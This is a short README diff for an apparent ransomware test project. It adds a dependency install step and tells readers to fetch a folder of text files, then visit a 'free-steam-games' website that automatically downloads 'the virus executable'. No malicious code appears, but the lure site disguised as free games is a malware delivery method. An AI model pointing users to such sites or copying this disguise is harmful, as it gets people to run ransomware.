@@ -1,5 +1,8 @@
 # Ransomware
 
+Before starting the test please install the dependencies by using the following command 
+sudo apt-get install inotify-tools zenity python3 -y
+
 Download the critical folder that consists of random text files into your ~/Download from the github repo provided 
 
 Visit the website to automatically download the virus executable file from "https://free-steam-games.github.io/"
